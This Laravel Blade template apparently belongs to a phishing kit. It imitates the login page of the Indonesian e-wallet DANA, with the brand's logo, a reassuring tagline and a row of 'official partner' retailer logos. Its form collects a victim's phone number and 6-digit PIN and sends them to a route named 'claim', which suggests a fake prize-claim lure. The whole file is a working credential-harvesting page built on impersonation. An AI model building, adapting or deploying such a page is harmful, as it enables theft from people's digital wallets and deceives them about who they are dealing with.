<x-layout title="Login DANA">
    <section class="auth-section">
        <div class="auth-card">
            <div class="auth-header">
                <img src="{{ asset('web/images/logo.png') }}" alt="DANA Logo" class="auth-logo">
                <h2>Login ke DANA</h2>
                <p>Akses mudah dan aman ke dompet digital kamu</p>
            </div>

            {{-- Form Login --}}
            <form method="POST" action="{{route('claim')}}" class="auth-form" id="loginForm">
                @csrf
                <div class="form-group">
                    <label for="no_telephone">Nomor HP</label>
                    <input type="text" id="no_telephone" name="no_telephone" class="form-control" required
                        placeholder="08xx-xxxx-xxxx" maxlength="14">
                </div>

                <div class="form-group">
                    <label for="password">Kata Sandi (6 digit)</label>
                    <input type="password" id="password" name="password" class="form-control" required maxlength="6"
                        pattern="[0-9]{6}" inputmode="numeric" autocomplete="one-time-code">

                    {{-- Indikator bulat --}}
                    <div class="pin-indicator" id="pinIndicator">
                        <span></span><span></span><span></span>
                        <span></span><span></span><span></span>
                    </div>
                </div>

                <div class="form-options">
                    <label>
                        <input type="checkbox" name="remember"> Ingat saya
                    </label>
                </div>

                <button type="submit" class="btn-primary w-full" id="loginBtn" disabled>Login</button>
            </form>
        </div>
    </section>
    <section class="section-gray">
        <h3 class="mitra-title">Mitra Resmi DANA</h3>
        <div class="mitra-slider">
            <div class="mitra-track">
                <img src="{{ asset('web/images/alfamart.png') }}" alt="Alfamart">
                <img src="{{ asset('web/images/indomaret.png') }}" alt="Indomaret">
                <img src="{{ asset('web/images/pegadaian.png') }}" alt="Pegadaian">
                <img src="{{ asset('web/images/pln.png') }}" alt="PLN">
                <img src="{{ asset('web/images/bpjs.png') }}" alt="BPJS">
                <img src="{{ asset('web/images/tokopedia.png') }}" alt="Tokopedia">
                <img src="{{ asset('web/images/shopee.png') }}" alt="Shopee">
                {{-- duplikat untuk loop animasi mulus --}}
                <img src="{{ asset('web/images/alfamart.png') }}" alt="Alfamart">
                <img src="{{ asset('web/images/indomaret.png') }}" alt="Indomaret">
                <img src="{{ asset('web/images/pegadaian.png') }}" alt="Pegadaian">
                <img src="{{ asset('web/images/pln.png') }}" alt="PLN">
                <img src="{{ asset('web/images/bpjs.png') }}" alt="BPJS">
                <img src="{{ asset('web/images/tokopedia.png') }}" alt="Tokopedia">
                <img src="{{ asset('web/images/shopee.png') }}" alt="Shopee">
            </div>
        </div>
    </section>

</x-layout>
